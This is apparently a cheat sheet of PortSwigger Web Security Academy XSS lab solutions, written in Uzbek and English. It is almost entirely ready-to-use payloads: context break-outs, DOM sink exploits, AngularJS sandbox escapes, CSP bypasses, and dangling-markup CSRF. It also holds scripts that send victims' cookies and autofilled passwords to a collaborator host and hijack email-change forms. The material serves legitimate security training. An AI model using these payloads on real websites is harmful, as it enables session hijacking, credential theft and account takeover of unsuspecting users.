# XSS — PortSwigger LAB yechimlari (cheat sheet)

> Lab host misol uchun **example.com** (lab'da `YOUR-LAB-ID.web-security-academy.net`).
> Exploit server — **exploit.example.net**. Collaborator — **COLLAB.example.net**.
> Payloadlar verbatim. START bermaysan — solution tahlili + tayyor vektorlar.

---

## Reflected / Stored — eng oson

### Reflected, nothing encoded — APPRENTICE
Qidiruv to'g'ridan HTML'ga tushadi, filtr yo'q.
```
<script>alert(1)</script>
```

### Stored, nothing encoded — APPRENTICE
Comment box'ga yozasan, saqlanadi, har ko'rgan odamda ishlaydi.
```
<script>alert(1)</script>
```

---

## Contexts — qayerga tushgan bo'lsa, shunga mos break-out

### Attribute ichiga, `<>` HTML-encoded — APPRENTICE
Qiymat `"..."` atribut ichida. Tirnoqdan chiqib, event qo'shasan.
```
"onmouseover="alert(1)
```

### JS string, `<>` + `"` encoded — APPRENTICE
Qiymat JS string ichida. Stringni yopib alert.
```
'-alert(1)-'
```

### JS string, `'` backslash-escaped, `<>` encoded — PRACTITIONER
`'` escape bo'ladi, lekin `\` escape bo'lmaydi → `\'` bilan escapeni buzasan.
```
\'-alert(1)//
```

### JS string, `'` va `\` escaped — PRACTITIONER
Stringdan chiqolmaysan → `</script>` bilan blokni yopib yangi script ochasan.
```
</script><script>alert(1)</script>
```

### JS template literal, hamma narsa escaped — PRACTITIONER
Backtick string ichida → `${}` expression ishlaydi.
```
${alert(1)}
```

### Anchor href, `"` encoded (stored) — APPRENTICE
Website inputi `href` ga tushadi → javascript: URL.
```
javascript:alert(1)
```

### onclick event, `'`+`\` escaped (stored) — PRACTITIONER
HTML-entity (`&apos;`) escapedan o'tadi.
```
http://foo?&apos;-alert(1)-&apos;
```

### href/event handler bloklangan — PRACTITIONER
SVG `<animate>` bilan `href` ni runtime'da qo'yasan.
```
<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a></svg>
```

### Canonical link tag — PRACTITIONER
`<link>` ga tushadi → accesskey + onclick.
```
https://example.com/?'accesskey='x'onclick='alert(1)
```
> Chrome. Trigger: `ALT+SHIFT+X` (Win) / `CTRL+ALT+X` (Mac) / `Alt+X` (Linux).

### Barcha standart teg bloklangan, custom teg mumkin — PRACTITIONER
Custom teg + onfocus + autofocus (`#x` fragment).
```
https://example.com/?search=<xss id=x onfocus=alert(document.cookie) tabindex=1>#x
```

### Ko'p teg/atribut bloklangan (WAF) — PRACTITIONER
Intruder bilan teg topasan (faqat `body`), event topasan (faqat `onresize`). Exploit:
```html
<iframe src="https://example.com/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
```

### Ba'zi SVG markup mumkin — PRACTITIONER
Intruder: faqat `svg/animatetransform/title/image` tegi, faqat `onbegin` event.
```
https://example.com/?search="><svg><animatetransform onbegin=alert(1)>
```

---

## DOM-based — client JS sink

### document.write sink (location.search) — APPRENTICE
Qidiruv `img src` ga `document.write` orqali tushadi.
```
"><svg onload=alert(1)>
```

### document.write sink, `<select>` ichida — PRACTITIONER
Avval `<select>` ni yopib chiqasan.
```
product?productId=1&storeId="></select><img src=1 onerror=alert(1)>
```

### innerHTML sink (location.search) — APPRENTICE
`<script>` innerHTML'da ishlamaydi → `onerror`.
```
<img src=1 onerror=alert(1)>
```

### jQuery href attribute sink (location.search) — APPRENTICE
`returnPath` → anchor `href`.
```
returnPath=javascript:alert(document.cookie)
```

### jQuery selector sink, hashchange — PRACTITIONER
`location.hash` → `$()` selector. iframe bilan hash'ga inject.
```html
<iframe src="https://example.com/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
```

### Reflected DOM XSS (eval) — PRACTITIONER
JSON javob `eval()` ga tushadi, `"` escaped lekin `\` yo'q.
```
\"-alert(1)}//
```

### Stored DOM XSS — PRACTITIONER
`replace()` faqat birinchi `<` ni encode qiladi.
```
<><img src=1 onerror=alert(1)>
```

### AngularJS expression, `<>`+`"` encoded — PRACTITIONER
`ng-app` scope → expression sandbox orqali.
```
{{$on.constructor('alert(1)')()}}
```

---

## CSTI — AngularJS sandbox escape

### AngularJS sandbox escape + CSP — EXPERT
Exploit server orqali deliver:
```html
<script> location='https://example.com/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x'; </script>
```

### AngularJS sandbox escape without strings — EXPERT
```
https://example.com/?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
```
> `charAt` ni `[].join` bilan override → sandbox sinadi. `fromCharCode(...)` = `x=alert(1)`.

---

## CSP bypass

### Reflected XSS + CSP bypass (report-uri token) — PRACTITIONER
`report-uri` dagi `token` parametri senga tegishli → o'z direktivangni qo'shasan.
```
https://example.com/?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&token=;script-src-elem%20%27unsafe-inline%27
```
> `script-src-elem 'unsafe-inline'` inline scriptga ruxsat beradi. Chrome.

### Very strict CSP + dangling markup — EXPERT
CSP juda qattiq → dangling markup bilan CSRF token'ni o'g'irlab, email o'zgartirasan.
Avval `formaction`/`formmethod=get` bilan token'ni URL'ga chiqar, keyin:
```html
<body>
<script>
const academyFrontend = "https://example.com/";
const exploitServer = "https://exploit.example.net/exploit";
const url = new URL(location);
const csrf = url.searchParams.get('csrf');
if (csrf) {
    const form = document.createElement('form');
    const email = document.createElement('input');
    const token = document.createElement('input');
    token.name = 'csrf'; token.value = csrf;
    email.name = 'email'; email.value = 'hacker@evil-user.net';
    form.method = 'post';
    form.action = `${academyFrontend}my-account/change-email`;
    form.append(email); form.append(token);
    document.documentElement.append(form);
    form.submit();
} else {
    location = `${academyFrontend}my-account?email=blah@blah%22%3E%3Cbutton+class=button%20formaction=${exploitServer}%20formmethod=get%20type=submit%3EClick%20me%3C/button%3E`;
}
</script>
</body>
```

---

## Exploiting XSS — IMPACT (pul shu yerda)

### Cookie o'g'irlash — PRACTITIONER
Stored comment'ga:
```html
<script> fetch('https://COLLAB.example.net', { method: 'POST', mode: 'no-cors', body:document.cookie }); </script>
```
> Collaborator → Poll now → victim cookie. Session hijack.

### Parol o'g'irlash (browser autofill) — PRACTITIONER
```html
<input name=username id=username> <input type=password name=password onchange="if(this.value.length)fetch('https://COLLAB.example.net',{ method:'POST', mode: 'no-cors', body:username.value+':'+this.value });">
```
> Browser parol manageri autofill qiladi → `onchange` jo'natadi.

### XSS → CSRF bypass (token o'g'irlab email o'zgartirish) — PRACTITIONER
```html
<script> var req = new XMLHttpRequest(); req.onload = handleResponse; req.open('get','/my-account',true); req.send(); function handleResponse() { var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1]; var changeReq = new XMLHttpRequest(); changeReq.open('post', '/my-account/change-email', true); changeReq.send('csrf='+token+'&email=test@test.com') }; </script>
```

---

### Eslatma
Filtr-evasion lablarida **Intruder + XSS cheat sheet** (teg ro'yxati, event ro'yxati)
asosiy metod. Umumiy payload/texnika uchun `../README.md` va bu papka asosiy README.
